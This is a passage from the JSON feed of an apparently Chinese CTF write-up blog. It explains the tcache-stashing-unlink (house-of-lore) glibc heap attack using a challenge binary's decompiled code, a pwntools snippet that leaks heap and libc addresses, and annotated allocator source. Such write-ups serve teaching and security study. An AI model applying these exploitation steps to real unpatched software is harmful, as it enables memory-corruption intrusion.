punctuation\">(</span> <span class=\"token punctuation\">(</span>p <span class=\"token operator\">=</span> nextp<span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>   <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre> <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>fb<span class=\"token operator\">++</span> <span class=\"token operator\">!=</span> maxfb<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure></blockquote>\n",
            "tags": [
                "house系列",
                "house-of-rabbit"
            ]
        },
        {
            "id": "https://yhuanhuan01.github.io/2024/07/22/tcache-stashing-unlink-attack(house-of-lore)/",
            "url": "https://yhuanhuan01.github.io/2024/07/22/tcache-stashing-unlink-attack(house-of-lore)/",
            "title": "tcache-stashing-unlink-attack(house-of-lore)",
            "date_published": "2024-07-22T10:44:49.000Z",
            "content_html": "<h1 id=\"tcache-stashing-unlink-attack\"><a class=\"markdownIt-Anchor\" href=\"#tcache-stashing-unlink-attack\">#</a> tcache-stashing-unlink-attack</h1>\n<blockquote>\n<p>house-of-lore 结合 tcache 的一套攻击流程</p>\n</blockquote>\n<p>漏洞成因</p>\n<blockquote>\n<p>堆溢出、 <code>use after free</code> 、 <code>edit after free</code></p>\n</blockquote>\n<p>适用范围</p>\n<blockquote>\n<ul>\n<li><code>2.23</code> ——  <code>2.31</code></li>\n<li>需要泄露或已知地址</li>\n</ul>\n</blockquote>\n<h3 id=\"概要\"><a class=\"markdownIt-Anchor\" href=\"#概要\">#</a> 概要：</h3>\n<p>通 uaf 修改 smallbin 大小的 free_chunk 的 bk 指针到目的地址，同时伪造目的地址的 fd 指针指向将被 free 的 chunk。从而实现获取一个任意地址分配的能力</p>\n<h3 id=\"绕过检测\"><a class=\"markdownIt-Anchor\" href=\"#绕过检测\">#</a> 绕过检测：</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">__glibc_unlikely</span> <span class=\"token punctuation\">(</span>bck<span class=\"token operator\">-></span>fd <span class=\"token operator\">!=</span> victim<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token function\">malloc_printerr</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"malloc(): smallbin double linked list corrupted\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h3 id=\"利用思路\"><a class=\"markdownIt-Anchor\" href=\"#利用思路\">#</a> 利用思路：</h3>\n<ul>\n<li>申请  <code>chunk A、chunk B、chunk C</code> ，其中  <code>chunk B</code>  大小位于  <code>smallbin</code></li>\n<li>释放  <code>B</code> ，申请更大的  <code>chunk D</code> ，使得  <code>B</code>  进入  <code>smallbin</code></li>\n<li>写  <code>A</code> ，溢出修改  <code>B</code>  的  <code>bk</code> ，指向地址  <code>X</code> ，这里有  <code>fake chunk</code></li>\n<li>布置  <code>X-&gt;fd == &amp;B</code></li>\n<li>分配两次后即可取出位于  <code>X</code>  地址处的  <code>fake chunk</code></li>\n</ul>\n<blockquote>\n<p>需要越过 tcache 取 smallbin 的 free_chunk</p>\n</blockquote>\n<h3 id=\"例题\"><a class=\"markdownIt-Anchor\" href=\"#例题\">#</a> 例题：</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1lodWFuaHVhbjAxL0NURl9Qd25fR2FtZS90cmVlL21haW4vdGNhY2hlLXN0YXNoaW5nLXVubGluay1hdHRhY2soaG91c2Utb2YtbG9yZSk=\">https://github.com/Yhuanhuan01/CTF_Pwn_Game/tree/main/tcache-stashing-unlink-attack(house-of-lore)</span></p>\n<p><img data-src=\"/img/house-of-lore/image-20240722143535687.png\" alt=\"image-20240722143535687\"></p>\n<blockquote>\n<p>还是先申代码吧</p>\n</blockquote>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> <span class=\"token function\">sub_11D5</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token function\">setbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdin</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token function\">setbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdout</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token function\">setbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  sys_malloc <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>__int64<span class=\"token punctuation\">)</span><span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x1000uLL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span>sys_malloc <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"What?\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  qword_4050 <span class=\"token operator\">=</span> sys_malloc <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFFFFFFFFFFFFF000LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token function\">alarm</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x1Eu</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>初始化函数，程序自己申请了一个 <code>0x1000</code> chunk</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">seccomd_box</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>      <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token function\">menu</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        choice <span class=\"token operator\">=</span> <span class=\"token function\">read_num</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> choice <span class=\"token operator\">!=</span> <span class=\"token number\">3</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>          <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span>v3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> choice <span class=\"token operator\">></span> <span class=\"token number\">3</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> choice <span class=\"token operator\">==</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> num_28 <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>          <span class=\"token function\">puts_err</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>v3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token operator\">--</span>num_28<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>      <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> choice <span class=\"token operator\">!=</span> <span class=\"token number\">2</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>          <span class=\"token keyword\">goto</span> LABEL_19<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token function\">delect</span><span class=\"token punctuation\">(</span>v3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// uaf</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> choice <span class=\"token operator\">==</span> <span class=\"token number\">5</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>      <span class=\"token function\">puts_err</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> choice <span class=\"token operator\">&lt;</span> <span class=\"token number\">5</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>      <span class=\"token function\">show</span><span class=\"token punctuation\">(</span>v3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> choice <span class=\"token operator\">!=</span> <span class=\"token number\">666</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>LABEL_19<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>        <span class=\"token function\">puts_err</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>      <span class=\"token function\">read_overbuf</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>             <span class=\"token comment\">// stack_read_overbuf</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>部分代码截取</p>\n<p>整体看一下，有沙盒，最多进入 add 28 次（有些已经注释过了一下</p>\n<ul>\n<li>add()</li>\n</ul>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 只列举比较重要的部分</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Please input the red packet idx: \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>num <span class=\"token operator\">=</span> <span class=\"token function\">read_num</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> num <span class=\"token operator\">></span> <span class=\"token number\">0x10</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token function\">puts_err</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v5 <span class=\"token operator\">!=</span> <span class=\"token number\">0x10</span> <span class=\"token operator\">&amp;&amp;</span> v5 <span class=\"token operator\">!=</span> <span class=\"token number\">0xF0</span> <span class=\"token operator\">&amp;&amp;</span> v5 <span class=\"token operator\">!=</span> <span class=\"token number\">0x300</span> <span class=\"token operator\">&amp;&amp;</span> v5 <span class=\"token operator\">!=</span> <span class=\"token number\">0x400</span> <span class=\"token punctuation\">)</span><span class=\"token comment\">// size_rule</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token function\">puts_err</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_QWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token number\">16LL</span> <span class=\"token operator\">*</span> num <span class=\"token operator\">+</span> a1<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token function\">calloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">1uLL</span><span class=\"token punctuation\">,</span> v5<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// user_malloc</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>a1 <span class=\"token operator\">+</span> <span class=\"token number\">16LL</span> <span class=\"token operator\">*</span> num <span class=\"token operator\">+</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> v5<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>只能去申请 <code>4个大小</code> 的 chunk，并且都不在 largebin 的范围内</p>\n<ul>\n<li>delect</li>\n</ul>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>num <span class=\"token operator\">=</span> <span class=\"token function\">read_num</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> num <span class=\"token operator\">></span> <span class=\"token number\">16</span> <span class=\"token operator\">||</span> <span class=\"token operator\">!</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_QWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token number\">16LL</span> <span class=\"token operator\">*</span> num <span class=\"token operator\">+</span> a1<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token function\">puts_err</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre> <span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token number\">16LL</span> <span class=\"token operator\">*</span> num <span class=\"token operator\">+</span> a1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>            <span class=\"token comment\">// uaf</span></pre></td></tr></table></figure><p>存在 <code>uaf</code>  漏洞</p>\n<ul>\n<li>edit</li>\n</ul>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> num_1 <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token function\">puts_err</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">--</span>num_1<span class=\"token punctuation\">;</span> <span class=\"token comment\">// 一次进入 edit 的机会</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Please input content: \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>v2 <span class=\"token operator\">=</span> <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token number\">16LL</span> <span class=\"token operator\">*</span> idx <span class=\"token operator\">+</span> a1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token number\">16LL</span> <span class=\"token operator\">*</span> idx <span class=\"token operator\">+</span> a1 <span class=\"token operator\">+</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><ul>\n<li>read_overbuf</li>\n</ul>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">char</span> buf<span class=\"token punctuation\">[</span><span class=\"token number\">128</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+0h] [rbp-80h] BYREF</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>__int64 <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>sys_malloc <span class=\"token operator\">+</span> <span class=\"token number\">0x800</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0x7F0000000000LL</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token operator\">||</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_QWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>sys_malloc <span class=\"token operator\">+</span> <span class=\"token number\">0x7F8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token operator\">||</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_QWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>sys_malloc <span class=\"token operator\">+</span> <span class=\"token number\">0x808</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token function\">puts_err</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 设置 sys_malloc+0x800 位置要大于 0x7F0000000000</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">return</span> <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">,</span> <span class=\"token number\">0x90uLL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 栈溢出</span></pre></td></tr></table></figure><p>存在栈溢出</p>\n<blockquote>\n<p>2.26 之后，ptmalloc 引入 tcache 机制， <code>0x20</code> - <code>0x410</code>  大小的 free_chunk 都会先进入 tcache_bin 内，之后满 7 个之后会进入符合其大小的 bin 内。</p>\n<p>在这个程序代码内，使用了 calloc 函数去创建分配堆块</p>\n<ul>\n<li>calloc 与 malloc 的区别是 <strong>calloc 在分配后会自动进行清空，这对于某些信息泄露漏洞的利用来说是致命的</strong>。</li>\n<li>不从 tcache 去相应大小的堆块</li>\n</ul>\n</blockquote>\n<p>这题的目的是修改 <code>sys_malloc + 0x800</code>  处，修改一个很大的数，从而拥有一个栈溢出的能力，因为栈溢出的长度太小，需要迁移。</p>\n<p>首先还是先填满 tachae 去泄露 libcbase 和 heapbase</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>Sho<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>heapaddr <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0xd1c0</span> <span class=\"token operator\">+</span> <span class=\"token number\">0xb000</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Sho<span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>libcaddr <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">96</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x10</span> <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">'heapaddr'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">'libcaddr'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>然后需要进行 <code>tcache-stashing-unlink-attack</code></p>\n<p>如何在本例实现此次攻击，需要结合 small 分配时的操作</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 获取 small bin 中倒数第二个 chunk 。</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>bck <span class=\"token operator\">=</span> victim<span class=\"token operator\">-></span>bk<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">// 检查 bck->fd 是不是 victim，防止伪造</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token function\">__glibc_unlikely</span><span class=\"token punctuation\">(</span> bck<span class=\"token operator\">-></span>fd <span class=\"token operator\">!=</span> victim <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token function\">malloc_printerr</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"malloc(): smallbin double linked list corrupted\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">// 设置 victim 对应的 inuse 位</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token function\">set_inuse_bit_at_offset</span> <span class=\"token punctuation\">(</span>victim<span class=\"token punctuation\">,</span> nb<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">// 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>bin<span class=\"token operator\">-></span>bk <span class=\"token operator\">=</span> bck<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>bck<span class=\"token operator\">-></span>fd <span class=\"token operator\">=</span> bin<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\">// 在当前 tcache 没有满，smallbin 不空的时候，把相同大小的 chunk 相继取出。注意：这里没有双向链表完整性检查</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>tcache<span class=\"token operator\">-></span>counts<span class=\"token punctuation\">[</span>tc_idx<span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span> mp_<span class=\"token punctuation\">.</span>tcache_count</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>       <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span>tc_victim <span class=\"token operator\">=</span> <span class=\"token function\">last</span> <span class=\"token punctuation\">(</span>bin<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> bin<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token 